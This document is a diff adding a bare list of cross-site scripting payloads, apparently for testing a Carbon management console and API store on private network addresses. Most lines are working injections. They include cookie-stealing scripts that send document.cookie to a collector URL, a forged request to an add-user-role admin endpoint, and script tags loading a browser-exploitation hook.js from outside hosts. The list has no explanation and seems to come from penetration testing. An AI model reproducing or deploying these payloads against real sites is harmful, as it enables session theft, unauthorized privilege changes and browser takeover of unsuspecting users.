@@ -1,0 +1,27 @@
+<img src="https://lh6.googleusercontent.com/HKPlF5VPN7UWhgJxd_45bKXV7DV6PYQnaRBRfYLCtbN1bJGCSob4ydQqqx9dC3DisgBl0MemNttbBRI=w1861-h941"/> 
+
+<body onload="alert(1)">
+
+"><script>alert(1)</script>
+
+Prakhash"><script>alert(document.cookie)</script></
+
+Prakhash"><script language="javascript">
+$( document ).ready(function() {
+ 	  var xhr = new XMLHttpRequest();
+      xhr.open("POST", "https://172.18.0.1:9444/carbon/userstore/add-user-role.jsp?region=region1&item=user_mgt_menu_add", true);
+      xhr.send();
+      alert(1)
+});
+  </script></
+
+Prakhash"><script>var i=new Image(); i.src="http://localhost:8080/XSSSamples/storecookie?cookievalues="%2bdocument.cookie;</script></
+
+https://172.18.0.1:9444/store/apis/info?name=PhoneVerification&version=1.0.0&provider=admin&tag=hello-group"><script>var i=new Image(); i.src="http://localhost:8080/XSSSamples/storecookie?cookievalues="%2bdocument.cookie;</script>		
+														
+https://172.18.0.1:9444/store/apis/info?name=PhoneVerification&version=1.0.0&provider=admin&tag=hello-group%22%3E%3Cscript%3Ealert(123)%3C/script%3E
+
+Prakhash"><script src="http://192.168.139.132:3000/hook.js"></script></
+
+Prakhash"><script>var i=new Image(); i.src="http://127.0.0.1:3000/hook.js"</script></
+
